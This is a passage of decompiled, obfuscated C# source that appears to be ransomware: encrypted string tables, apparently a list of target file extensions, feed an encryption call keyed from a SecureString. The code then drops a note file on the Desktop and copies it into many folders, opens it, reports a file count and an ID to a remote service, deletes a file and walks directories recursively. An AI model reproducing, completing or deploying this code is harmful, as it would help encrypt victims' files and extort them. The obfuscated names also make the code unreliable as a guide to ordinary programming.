				getString_0(107385066),
				getString_0(107385061),
				getString_0(107385024),
				getString_0(107385019),
				getString_0(107385014),
				getString_0(107385009),
				getString_0(107385032),
				getString_0(107385027),
				getString_0(107384990),
				getString_0(107384981),
				getString_0(107385008),
				getString_0(107384999),
				getString_0(107384994),
				getString_0(107384957),
				getString_0(107384952),
				getString_0(107384947),
				getString_0(107384974),
				getString_0(107384961),
				getString_0(107385436),
				getString_0(107385431),
				getString_0(107385426),
				getString_0(107385453),
				getString_0(107385448),
				getString_0(107385443),
				getString_0(107385406),
				getString_0(107385401),
				getString_0(107385396),
				getString_0(107385423),
				getString_0(107385418),
				getString_0(107385413),
				getString_0(107385376),
				getString_0(107385371),
				getString_0(107385362),
				getString_0(107385389),
				getString_0(107385344),
				getString_0(107385335),
				getString_0(107385358),
				getString_0(107385353),
				getString_0(107385312),
				getString_0(107385307),
				getString_0(107385298),
				getString_0(107385325),
				getString_0(107385320),
				getString_0(107385315),
				getString_0(107385278),
				getString_0(107385269),
				getString_0(107385292),
				getString_0(107385283),
				getString_0(107385246),
				getString_0(107385237),
				getString_0(107385256),
				getString_0(107385215),
				getString_0(107385206),
				getString_0(107385225),
				getString_0(107384672),
				getString_0(107384663),
				getString_0(107384686),
				getString_0(107384681),
				getString_0(107384676),
				getString_0(107384639),
				getString_0(107384630),
				getString_0(107384653),
				getString_0(107384648),
				getString_0(107384643),
				getString_0(107384606),
				getString_0(107384601),
				getString_0(107384624),
				getString_0(107384611),
				getString_0(107384570),
				getString_0(107384589),
				getString_0(107384544),
				getString_0(107384535),
				getString_0(107384550),
				getString_0(107384509),
				getString_0(107384500),
				getString_0(107384523),
				getString_0(107384518),
				getString_0(107384513),
				getString_0(107384476),
				getString_0(107384467),
				getString_0(107384494),
				getString_0(107384489),
				getString_0(107384484),
				getString_0(107384447),
				getString_0(107384442),
				getString_0(107384433),
				getString_0(107384460),
				getString_0(107384455),
				getString_0(107384926),
				getString_0(107384921),
				getString_0(107384916),
				getString_0(107384939),
				getString_0(107384930),
				getString_0(107384893),
				getString_0(107384888),
				getString_0(107384911),
				getString_0(107384898),
				getString_0(107384861),
				getString_0(107384856),
				getString_0(107384879),
				getString_0(107384870),
				getString_0(107384865),
				getString_0(107384828),
				getString_0(107384823),
				getString_0(107384818),
				getString_0(107384845),
				getString_0(107384840),
				getString_0(107384835),
				getString_0(107384798),
				getString_0(107384789),
				getString_0(107384816),
				getString_0(107384811),
				getString_0(107384806),
				getString_0(107384765),
				getString_0(107384784),
				getString_0(107384771),
				getString_0(107384730),
				getString_0(107384725),
				getString_0(107384752),
				getString_0(107384747),
				getString_0(107384742),
				getString_0(107384737),
				getString_0(107384700),
				getString_0(107384695),
				getString_0(107384690),
				getString_0(107384717),
				getString_0(107384712),
				getString_0(107384707),
				getString_0(107384154),
				getString_0(107384149),
				getString_0(107384176),
				getString_0(107384171),
				getString_0(107384166),
				getString_0(107384161),
				getString_0(107384124),
				getString_0(107384119),
				getString_0(107384114),
				getString_0(107384141),
				getString_0(107384136),
				getString_0(107384131),
				getString_0(107384094),
				getString_0(107384089),
				getString_0(107384084),
				getString_0(107384111),
				getString_0(107384106),
				getString_0(107384101),
				getString_0(107384060),
				getString_0(107384051),
				getString_0(107384078),
				getString_0(107384073),
				getString_0(107384068),
				getString_0(107384031),
				getString_0(107384026),
				getString_0(107384017),
				getString_0(107384044),
				getString_0(107384039),
				getString_0(107383998),
				getString_0(107383993),
				getString_0(107383988),
				getString_0(107384003),
				getString_0(107383966),
				getString_0(107383961),
				getString_0(107383956),
				getString_0(107383983),
				getString_0(107383978),
				getString_0(107383973),
				getString_0(107383932),
				getString_0(107383927),
				getString_0(107383922),
				getString_0(107383949),
				getString_0(107383944),
				getString_0(107383939),
				getString_0(107384414),
				getString_0(107384409),
				getString_0(107384404),
				getString_0(107384431),
				getString_0(107384426),
				getString_0(107384421),
				getString_0(107384384),
				getString_0(107384379),
				getString_0(107384374),
				getString_0(107384369),
				getString_0(107384396),
				getString_0(107384391),
				getString_0(107384386),
				getString_0(107384349),
				getString_0(107384340),
				getString_0(107384367),
				getString_0(107384362),
				getString_0(107384357),
				getString_0(107384320),
				getString_0(107384311),
				getString_0(107384306),
				getString_0(107384333),
				getString_0(107384328),
				getString_0(107384323),
				getString_0(107384286),
				getString_0(107384281),
				getString_0(107384276),
				getString_0(107384299),
				getString_0(107384294),
				getString_0(107384289),
				getString_0(107384248),
				getString_0(107384263),
				getString_0(107384258),
				getString_0(107384221),
				getString_0(107384216),
				getString_0(107384239),
				getString_0(107384234),
				getString_0(107384189),
				getString_0(107384180),
				getString_0(107384203),
				getString_0(107384198),
				getString_0(107384193),
				getString_0(107383644),
				getString_0(107383639),
				getString_0(107383634),
				getString_0(107383661),
				getString_0(107383652),
				getString_0(107383615),
				getString_0(107383606),
				getString_0(107383601),
				getString_0(107383628),
				getString_0(107383623),
				getString_0(107383618),
				getString_0(107383581),
				getString_0(107383576),
				getString_0(107383571),
				getString_0(107383598),
				getString_0(107383593),
				getString_0(107383588),
				getString_0(107383551),
				getString_0(107383546),
				getString_0(107383541),
				getString_0(107383568),
				getString_0(107383559),
				getString_0(107383554),
				getString_0(107383517),
				getString_0(107383512),
				getString_0(107383507),
				getString_0(107383534),
				getString_0(107383529),
				getString_0(107383524),
				getString_0(107383483),
				getString_0(107383478),
				getString_0(107383501),
				getString_0(107383496),
				getString_0(107383491),
				getString_0(107383454),
				getString_0(107383445),
				getString_0(107383468),
				getString_0(107383463),
				getString_0(107383458),
				getString_0(107383417),
				getString_0(107383412),
				getString_0(107383439),
				getString_0(107383434),
				getString_0(107383429),
				getString_0(107383900),
				getString_0(107383895),
				getString_0(107383890),
				getString_0(107383913),
				getString_0(107383872),
				getString_0(107383867),
				getString_0(107383858),
				getString_0(107383885),
				getString_0(107383876),
				getString_0(107383835),
				getString_0(107383830),
				getString_0(107383825),
				getString_0(107383852),
				getString_0(107383847),
				getString_0(107383842),
				getString_0(107383805),
				getString_0(107383800),
				getString_0(107383795),
				getString_0(107383814),
				getString_0(107383809),
				getString_0(107383768),
				getString_0(107383763),
				getString_0(107383790),
				getString_0(107383781),
				getString_0(107383740),
				getString_0(107383735),
				getString_0(107383730),
				getString_0(107383757),
				getString_0(107383748),
				getString_0(107383711),
				getString_0(107383706),
				getString_0(107383697),
				getString_0(107383716),
				getString_0(107383679),
				getString_0(107383666),
				getString_0(107383693),
				getString_0(107383684),
				getString_0(107383135),
				getString_0(107383130),
				getString_0(107383125),
				getString_0(107383152),
				getString_0(107383143),
				getString_0(107383102),
				getString_0(107383093),
				getString_0(107383112),
				getString_0(107383107),
				getString_0(107383066),
				getString_0(107383061),
				getString_0(107383088),
				getString_0(107383083),
				getString_0(107383074),
				getString_0(107383037),
				getString_0(107383032),
				getString_0(107383055),
				getString_0(107383046),
				getString_0(107383041),
				getString_0(107382996),
				getString_0(107383019),
				getString_0(107383014),
				getString_0(107383009),
				getString_0(107382972),
				getString_0(107382967),
				getString_0(107382962),
				getString_0(107382989),
				getString_0(107382984),
				getString_0(107382979),
				getString_0(107382942),
				getString_0(107382937),
				getString_0(107382956),
				getString_0(107382951),
				getString_0(107382946),
				getString_0(107382909),
				getString_0(107382924),
				getString_0(107382919),
				getString_0(107382914),
				getString_0(107383385),
				getString_0(107383380),
				getString_0(107383407),
				getString_0(107383402),
				getString_0(107383397),
				getString_0(107383360),
				getString_0(107383355),
				getString_0(107383374),
				getString_0(107383365),
				getString_0(107383328),
				getString_0(107383323),
				getString_0(107383318),
				getString_0(107383313),
				getString_0(107383336),
				getString_0(107383295),
				getString_0(107383290),
				getString_0(107383285),
				getString_0(107383308),
				getString_0(107383303),
				getString_0(107383298),
				getString_0(107383261),
				getString_0(107383256),
				getString_0(107383251),
				getString_0(107383278),
				getString_0(107383273),
				getString_0(107383268),
				getString_0(107383227),
				getString_0(107383222),
				getString_0(107383217),
				getString_0(107383244),
				getString_0(107383235),
				getString_0(107383198),
				getString_0(107383189),
				getString_0(107383216),
				getString_0(107383211),
				getString_0(107383202),
				getString_0(107383165),
				getString_0(107383160),
				getString_0(107383155),
				getString_0(107383182),
				getString_0(107383173),
				getString_0(107382620),
				getString_0(107382615),
				getString_0(107382610),
				getString_0(107382637),
				getString_0(107382632),
				getString_0(107382627),
				getString_0(107382586),
				getString_0(107382577),
				getString_0(107382604),
				getString_0(107382599),
				getString_0(107382594),
				getString_0(107382557),
				getString_0(107382552),
				getString_0(107382547),
				getString_0(107382574),
				getString_0(107382569),
				getString_0(107382564),
				getString_0(107382527),
				getString_0(107382518),
				getString_0(107382513),
				getString_0(107382540),
				getString_0(107382535),
				getString_0(107382494),
				getString_0(107382489),
				getString_0(107382484),
				getString_0(107382511),
				getString_0(107382506),
				getString_0(107382501),
				getString_0(107382464),
				getString_0(107382459),
				getString_0(107382454),
				getString_0(107382449),
				getString_0(107382476),
				getString_0(107382471),
				getString_0(107382466),
				getString_0(107382429),
				getString_0(107382420),
				getString_0(107382447),
				getString_0(107382442),
				getString_0(107382437),
				getString_0(107382396),
				getString_0(107382387),
				getString_0(107382414),
				getString_0(107382405),
				getString_0(107382876),
				getString_0(107382871),
				getString_0(107382894),
				getString_0(107382881),
				getString_0(107382836),
				getString_0(107382855),
				getString_0(107382850),
				getString_0(107382813),
				getString_0(107382808),
				getString_0(107382803),
				getString_0(107382826),
				getString_0(107382821),
				getString_0(107382784),
				getString_0(107382779),
				getString_0(107382774),
				getString_0(107382769),
				getString_0(107382796),
				getString_0(107382787),
				getString_0(107382750),
				getString_0(107382745),
				getString_0(107382740),
				getString_0(107382767),
				getString_0(107382762),
				getString_0(107382757),
				getString_0(107382720),
				getString_0(107382715),
				getString_0(107382710),
				getString_0(107382705),
				getString_0(107382732),
				getString_0(107382727),
				getString_0(107382686),
				getString_0(107382677),
				getString_0(107382704),
				getString_0(107382699),
				getString_0(107382694),
				getString_0(107382653),
				getString_0(107382648),
				getString_0(107382643),
				getString_0(107382670),
				getString_0(107382665),
				getString_0(107382112),
				getString_0(107382107),
				getString_0(107382098),
				getString_0(107382125),
				getString_0(107382120),
				getString_0(107382115),
				getString_0(107382078),
				getString_0(107382073),
				getString_0(107382068),
				getString_0(107382095),
				getString_0(107382090),
				getString_0(107382081),
				getString_0(107382040),
				getString_0(107382035),
				getString_0(107382058),
				getString_0(107382053),
				getString_0(107382016),
				getString_0(107382011),
				getString_0(107382006),
				getString_0(107382001),
				getString_0(107382028),
				getString_0(107382023),
				getString_0(107382018),
				getString_0(107381977),
				getString_0(107381972),
				getString_0(107381999),
				getString_0(107381990),
				getString_0(107381985),
				getString_0(107381948),
				getString_0(107381943),
				getString_0(107381938),
				getString_0(107381965),
				getString_0(107381960),
				getString_0(107381955),
				getString_0(107381918),
				getString_0(107381913),
				getString_0(107381908),
				getString_0(107381935),
				getString_0(107381930),
				getString_0(107381925),
				getString_0(107381888),
				getString_0(107381883),
				getString_0(107381878),
				getString_0(107381893),
				getString_0(107382384),
				getString_0(107382379),
				getString_0(107382374),
				getString_0(107382369),
				getString_0(107382324),
				getString_0(107382343),
				getString_0(107382298),
				getString_0(107382293),
				getString_0(107382320),
				getString_0(107382315),
				getString_0(107382310),
				getString_0(107382269),
				getString_0(107382260),
				getString_0(107382287),
				getString_0(107382282),
				getString_0(107382277),
				getString_0(107382240),
				getString_0(107382235),
				getString_0(107382230),
				getString_0(107382253),
				getString_0(107382248),
				getString_0(107382243),
				getString_0(107382198),
				getString_0(107382193),
				getString_0(107382216),
				getString_0(107382171),
				getString_0(107382162),
				getString_0(107382177),
				getString_0(107382132),
				getString_0(107382159),
				getString_0(107382154),
				getString_0(107382149),
				getString_0(107381596),
				getString_0(107381591),
				getString_0(107381586),
				getString_0(107381613),
				getString_0(107381608),
				getString_0(107381567),
				getString_0(107381558),
				getString_0(107381553),
				getString_0(107381580),
				getString_0(107381575),
				getString_0(107381534),
				getString_0(107381529),
				getString_0(107381524),
				getString_0(107381551),
				getString_0(107381546),
				getString_0(107381541),
				getString_0(107381504),
				getString_0(107381499),
				getString_0(107381494),
				getString_0(107381489),
				getString_0(107381516),
				getString_0(107381511),
				getString_0(107381506),
				getString_0(107381469),
				getString_0(107381484),
				getString_0(107381479),
				getString_0(107381474),
				getString_0(107381437),
				getString_0(107381428),
				getString_0(107381451),
				getString_0(107381446),
				getString_0(107381405),
				getString_0(107381400),
				getString_0(107381419),
				getString_0(107381370),
				getString_0(107381365),
				getString_0(107381392),
				getString_0(107381387),
				getString_0(107381378),
				getString_0(107381853),
				getString_0(107381848),
				getString_0(107381867),
				getString_0(107381858),
				getString_0(107381821),
				getString_0(107381816),
				getString_0(107381811),
				getString_0(107381834),
				getString_0(107381829),
				getString_0(107381788),
				getString_0(107381779),
				getString_0(107381806),
				getString_0(107381801),
				getString_0(107381796),
				getString_0(107381755),
				getString_0(107381746),
				getString_0(107381773),
				getString_0(107381768),
				getString_0(107381763),
				getString_0(107381726),
				getString_0(107381721),
				getString_0(107381716),
				getString_0(107381743),
				getString_0(107381738),
				getString_0(107381729),
				getString_0(107381692),
				getString_0(107381687),
				getString_0(107381682),
				getString_0(107381709),
				getString_0(107381704),
				getString_0(107381699),
				getString_0(107381662),
				getString_0(107381657),
				getString_0(107381680),
				getString_0(107381675),
				getString_0(107381670),
				getString_0(107381665),
				getString_0(107381624),
				getString_0(107381619),
				getString_0(107381646),
				getString_0(107381633),
				getString_0(107381084),
				getString_0(107381079),
				getString_0(107381074),
				getString_0(107381101),
				getString_0(107381096),
				getString_0(107381091),
				getString_0(107381050),
				getString_0(107381045),
				getString_0(107381068),
				getString_0(107381063),
				getString_0(107381014),
				getString_0(107381009),
				getString_0(107381036),
				getString_0(107381031),
				getString_0(107381026),
				getString_0(107380989),
				getString_0(107380984),
				getString_0(107380979),
				getString_0(107381006),
				getString_0(107381001),
				getString_0(107380996),
				getString_0(107380955),
				getString_0(107380950),
				getString_0(107380945),
				getString_0(107380972),
				getString_0(107380967),
				getString_0(107380962),
				getString_0(107380925),
				getString_0(107380920),
				getString_0(107380915),
				getString_0(107380942),
				getString_0(107380937),
				getString_0(107380932),
				getString_0(107380895),
				getString_0(107380886),
				getString_0(107380909),
				getString_0(107380904),
				getString_0(107380899),
				getString_0(107380858),
				getString_0(107380853),
				getString_0(107380880),
				getString_0(107380871),
				getString_0(107380866),
				getString_0(107381341),
				getString_0(107381336),
				getString_0(107381331),
				getString_0(107381358),
				getString_0(107381353),
				getString_0(107381312),
				getString_0(107381307),
				getString_0(107381302),
				getString_0(107381297),
				getString_0(107381320),
				getString_0(107381315),
				getString_0(107381274),
				getString_0(107381265),
				getString_0(107381292),
				getString_0(107381287),
				getString_0(107381282),
				getString_0(107381241),
				getString_0(107381264),
				getString_0(107381259),
				getString_0(107381254),
				getString_0(107381249),
				getString_0(107381208),
				getString_0(107381203),
				getString_0(107381230),
				getString_0(107381221),
				getString_0(107381184),
				getString_0(107381171),
				getString_0(107381198),
				getString_0(107381193),
				getString_0(107381188),
				getString_0(107381151),
				getString_0(107381142),
				getString_0(107381137),
				getString_0(107381164),
				getString_0(107381155),
				getString_0(107381118),
				getString_0(107381113),
				getString_0(107381132),
				getString_0(107381127),
				getString_0(107413342),
				getString_0(107413337),
				getString_0(107413356),
				getString_0(107413351),
				getString_0(107413346),
				getString_0(107413309),
				getString_0(107413304),
				getString_0(107413299),
				getString_0(107413326),
				getString_0(107413321),
				getString_0(107413316),
				getString_0(107413279),
				getString_0(107413274),
				getString_0(107413269),
				getString_0(107413296),
				getString_0(107413287),
				getString_0(107413282),
				getString_0(107413241),
				getString_0(107413264),
				getString_0(107413259),
				getString_0(107413254),
				getString_0(107413213),
				getString_0(107413204),
				getString_0(107413231),
				getString_0(107413226),
				getString_0(107413217),
				getString_0(107413180),
				getString_0(107413175),
				getString_0(107413170),
				getString_0(107413197),
				getString_0(107413192),
				getString_0(107413187),
				getString_0(107413146),
				getString_0(107413141),
				getString_0(107413168),
				getString_0(107413163),
				getString_0(107413158),
				getString_0(107413153),
				getString_0(107413112),
				getString_0(107413107),
				getString_0(107413134),
				getString_0(107413129),
				getString_0(107413600),
				getString_0(107413591),
				getString_0(107413586),
				getString_0(107413613),
				getString_0(107413604),
				getString_0(107413563),
				getString_0(107413558),
				getString_0(107413581),
				getString_0(107413536),
				getString_0(107413531),
				getString_0(107413522),
				getString_0(107413549),
				getString_0(107413544),
				getString_0(107413539),
				getString_0(107413502),
				getString_0(107413497),
				getString_0(107413492),
				getString_0(107413519),
				getString_0(107413514),
				getString_0(107413509),
				getString_0(107413472),
				getString_0(107413467),
				getString_0(107413462),
				getString_0(107413457),
				getString_0(107413484),
				getString_0(107413475),
				getString_0(107413438),
				getString_0(107413433),
				getString_0(107413428),
				getString_0(107413451),
				getString_0(107413446),
				getString_0(107413405),
				getString_0(107413400),
				getString_0(107413395),
				getString_0(107413418),
				getString_0(107413409),
				getString_0(107413372),
				getString_0(107413367),
				getString_0(107413362),
				getString_0(107413389),
				getString_0(107413384),
				getString_0(107412831),
				getString_0(107412822),
				getString_0(107412841),
				getString_0(107412796),
				getString_0(107412791),
				getString_0(107412786),
				getString_0(107412809),
				getString_0(107412804),
				getString_0(107412763),
				getString_0(107412758),
				getString_0(107412753),
				getString_0(107412780),
				getString_0(107412771),
				getString_0(107412734),
				getString_0(107412725),
				getString_0(107412748),
				getString_0(107412739),
				getString_0(107412698),
				getString_0(107412693),
				getString_0(107412720),
				getString_0(107412715),
				getString_0(107412710),
				getString_0(107412669),
				getString_0(107412664),
				getString_0(107412659),
				getString_0(107412686),
				getString_0(107412681),
				getString_0(107412676),
				getString_0(107412639),
				getString_0(107412630),
				getString_0(107412625),
				getString_0(107412652),
				getString_0(107412647),
				getString_0(107412642),
				getString_0(107412605),
				getString_0(107412600),
				getString_0(107412595),
				getString_0(107412622),
				getString_0(107412617),
				getString_0(107412612),
				getString_0(107413087),
				getString_0(107413082),
				getString_0(107413073),
				getString_0(107413100),
				getString_0(107413095),
				getString_0(107413054),
				getString_0(107413049),
				getString_0(107413044),
				getString_0(107413071),
				getString_0(107413066),
				getString_0(107413061),
				getString_0(107413024),
				getString_0(107413015),
				getString_0(107413010),
				getString_0(107413037),
				getString_0(107413032),
				getString_0(107413027),
				getString_0(107412986),
				getString_0(107412981),
				getString_0(107413008),
				getString_0(107413003),
				getString_0(107412998),
				getString_0(107412993),
				getString_0(107412956),
				getString_0(107412951),
				getString_0(107412946),
				getString_0(107412969),
				getString_0(107412964),
				getString_0(107412927),
				getString_0(107412922),
				getString_0(107412913),
				getString_0(107412940),
				getString_0(107412935),
				getString_0(107412930),
				getString_0(107412893),
				getString_0(107412888),
				getString_0(107412911),
				getString_0(107412906),
				getString_0(107412901),
				getString_0(107412864),
				getString_0(107412855),
				getString_0(107412850),
				getString_0(107412877),
				getString_0(107412872),
				getString_0(107412867),
				getString_0(107412318),
				getString_0(107412313),
				getString_0(107412336),
				getString_0(107412331),
				getString_0(107412322),
				getString_0(107412281),
				getString_0(107412276),
				getString_0(107412303),
				getString_0(107412298),
				getString_0(107412293),
				getString_0(107412256),
				getString_0(107412251),
				getString_0(107412242),
				getString_0(107412269),
				getString_0(107412264),
				getString_0(107412259),
				getString_0(107412222),
				getString_0(107412213),
				getString_0(107412236),
				getString_0(107412231),
				getString_0(107412226),
				getString_0(107412189),
				getString_0(107412180),
				getString_0(107412207),
				getString_0(107412202),
				getString_0(107412193),
				getString_0(107412152),
				getString_0(107412171),
				getString_0(107412162),
				getString_0(107412121),
				getString_0(107412144),
				getString_0(107412135),
				getString_0(107412094),
				getString_0(107412089),
				getString_0(107412108),
				getString_0(107412099),
				getString_0(107412570),
				getString_0(107412565),
				getString_0(107412592),
				getString_0(107412583),
				getString_0(107412578),
				getString_0(107412537),
				getString_0(107412532),
				getString_0(107412555),
				getString_0(107412550),
				getString_0(107412545),
				getString_0(107412508),
				getString_0(107412527),
				getString_0(107412518),
				getString_0(107412513),
				getString_0(107412476),
				getString_0(107412471),
				getString_0(107412466),
				getString_0(107412489),
				getString_0(107412484),
				getString_0(107412443),
				getString_0(107412438),
				getString_0(107412433),
				getString_0(107412460),
				getString_0(107412451),
				getString_0(107412414),
				getString_0(107412409),
				getString_0(107412432),
				getString_0(107412427),
				getString_0(107412418),
				getString_0(107412377),
				getString_0(107412372),
				getString_0(107412399),
				getString_0(107412390),
				getString_0(107412349),
				getString_0(107412340),
				getString_0(107412367),
				getString_0(107412362),
				getString_0(107412357),
				getString_0(107411808),
				getString_0(107411799),
				getString_0(107411794),
				getString_0(107411821),
				getString_0(107411776),
				getString_0(107411763),
				getString_0(107411782),
				getString_0(107411737),
				getString_0(107411732),
				getString_0(107411759),
				getString_0(107411754),
				getString_0(107411749),
				getString_0(107411712),
				getString_0(107411707),
				getString_0(107411698),
				getString_0(107411725),
				getString_0(107411720),
				getString_0(107411679),
				getString_0(107411670),
				getString_0(107411665),
				getString_0(107411692),
				getString_0(107411687),
				getString_0(107411682),
				getString_0(107411645),
				getString_0(107411640),
				getString_0(107411635),
				getString_0(107411662),
				getString_0(107411653),
				getString_0(107411616),
				getString_0(107411611),
				getString_0(107411602),
				getString_0(107411629),
				getString_0(107411624),
				getString_0(107411619),
				getString_0(107411582),
				getString_0(107411577),
				getString_0(107411572),
				getString_0(107411595),
				getString_0(107411590),
				getString_0(107411585),
				getString_0(107412060)
			}, new string[0], DaNjtiFanUZ(secureString), getString_0(107412051));
		}
		catch (Exception ex9)
		{
			if (qphnWLJhmOUolrV)
			{
				try
				{
					File.AppendAllText(GqXvKuGfqke, getString_0(107412030) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107412037)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107412037));
				streamWriter.WriteLine(DRlXtEGdcAr(getString_0(107412004)));
				streamWriter.WriteLine(getString_0(107396410));
				streamWriter.WriteLine(DRlXtEGdcAr(getString_0(107407194)));
				streamWriter.WriteLine(CVJRzPfpAOOaE);
				if (uUqSvzVKAfyGAz == getString_0(107397156))
				{
					streamWriter.WriteLine(getString_0(107396410));
					streamWriter.WriteLine(DRlXtEGdcAr(getString_0(107407161)) + Convert.ToString(UdjWdPcrsN.Count));
				}
				if (JaGTzvkqDZS)
				{
					streamWriter.WriteLine(getString_0(107396410));
					streamWriter.WriteLine(DRlXtEGdcAr(getString_0(107407116)));
					streamWriter.WriteLine(XCKLADindvJZ.zhDvisqDYmjg());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107412037));
				if (!text3.Contains(CVJRzPfpAOOaE) && !DfXjMyctTQk)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107412037), getString_0(107407083) + CVJRzPfpAOOaE);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in nfYRZbrPjpWWw)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107412037)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107412037), item + getString_0(107412037), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107412037));
					if (!text4.Contains(CVJRzPfpAOOaE) && !DfXjMyctTQk)
					{
						File.AppendAllText(item + getString_0(107412037), getString_0(107407083) + CVJRzPfpAOOaE);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!QufKUxajeWOAYn && num > 10)
			{
				break;
			}
		}
		if (mgesYTxzqcBoi == getString_0(107396727))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407054)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407054));
					streamWriter2.WriteLine(DRlXtEGdcAr(getString_0(107407021)));
					streamWriter2.WriteLine(getString_0(107396410));
					streamWriter2.WriteLine(DRlXtEGdcAr(getString_0(107368189)));
					streamWriter2.WriteLine(CVJRzPfpAOOaE + DRlXtEGdcAr(getString_0(107368132)));
					if (uUqSvzVKAfyGAz == getString_0(107397156))
					{
						streamWriter2.WriteLine(getString_0(107396410));
						streamWriter2.WriteLine(DRlXtEGdcAr(getString_0(107368087)) + DRlXtEGdcAr(getString_0(107407161)) + Convert.ToString(UdjWdPcrsN.Count) + DRlXtEGdcAr(getString_0(107368132)));
					}
					if (JaGTzvkqDZS)
					{
						streamWriter2.WriteLine(getString_0(107396410));
						streamWriter2.WriteLine(DRlXtEGdcAr(getString_0(107407116)));
						streamWriter2.WriteLine(XCKLADindvJZ.zhDvisqDYmjg());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107412037));
					if (!text5.Contains(CVJRzPfpAOOaE) && !DfXjMyctTQk)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407054), DRlXtEGdcAr(getString_0(107368087)) + getString_0(107407083) + CVJRzPfpAOOaE + DRlXtEGdcAr(getString_0(107368132)));
					}
				}
			}
			catch
			{
			}
		}
		if (GoYBdoxJtLgwHQ == getString_0(107396727))
		{
			try
			{
				if (uUqSvzVKAfyGAz == getString_0(107397156))
				{
					XCKLADindvJZ.iGMUTvRVUQklL(getString_0(107368538), getString_0(107368533), getString_0(107368552), string.Concat(DRlXtEGdcAr(getString_0(107396988)), new WebClient().DownloadString(DRlXtEGdcAr(getString_0(107396995))), getString_0(107368511), DRlXtEGdcAr(getString_0(107396405)), DateTime.Now, getString_0(107396410), DRlXtEGdcAr(getString_0(107368506)), Convert.ToString(UdjWdPcrsN.Count), getString_0(107396410), DRlXtEGdcAr(getString_0(107396396)), CVJRzPfpAOOaE));
				}
				else
				{
					XCKLADindvJZ.iGMUTvRVUQklL(getString_0(107368538), getString_0(107368533), getString_0(107368552), string.Concat(DRlXtEGdcAr(getString_0(107396988)), new WebClient().DownloadString(DRlXtEGdcAr(getString_0(107396995))), getString_0(107368511), DRlXtEGdcAr(getString_0(107396405)), DateTime.Now, getString_0(107396410), DRlXtEGdcAr(getString_0(107368506)), Convert.ToString(UdjWdPcrsN.Count), getString_0(107396410), DRlXtEGdcAr(getString_0(107396396)), CVJRzPfpAOOaE));
				}
			}
			catch
			{
			}
		}
		if (ZVpOsTOahvYy == getString_0(107396727))
		{
			try
			{
				xjqlNkBAKrfO.NKMHnWNIYCAaeN(new Uri(getString_0(107368489)));
			}
			catch
			{
			}
		}
		if (mgesYTxzqcBoi == getString_0(107397156))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107412037)))
				{
					Process.Start(DRlXtEGdcAr(getString_0(107368488)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107412037));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407054)))
				{
					Process.Start(DRlXtEGdcAr(getString_0(107368463)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407054));
				}
			}
			catch
			{
			}
		}
		if (WrETenYYrsTSs == getString_0(107396727))
		{
			if (pdgCKKhrrBHZnX == getString_0(107396727) && !string.IsNullOrEmpty(jmjaTLfeuxPg) && !string.IsNullOrEmpty(lTtDZSKOub))
			{
				rAeJOuWancoBj(jmjaTLfeuxPg, lTtDZSKOub);
			}
			else
			{
				rAeJOuWancoBj(getString_0(107368414), getString_0(107368417));
			}
		}
		if (XyKjfboizG != getString_0(107367639))
		{
			BvCtAHIesjG(XyKjfboizG);
		}
		if (!string.IsNullOrEmpty(yMxnBnnzZwyRqt))
		{
			try
			{
				File.Delete(yMxnBnnzZwyRqt);
			}
			catch
			{
			}
		}
		if (qphnWLJhmOUolrV)
		{
			try
			{
				File.AppendAllText(GqXvKuGfqke, getString_0(107367654));
			}
			catch (Exception)
			{
			}
		}
		if (xTxFXXfbdYYKqKr == getString_0(107367609))
		{
			qWuBXxnBId();
		}
	}

	public static void HspEkwjmGD()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(DRlXtEGdcAr(getString_0(107367632)), DRlXtEGdcAr(getString_0(107368414)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int RAUpfuEJjyxg(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> IsaIYwLIDjd(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
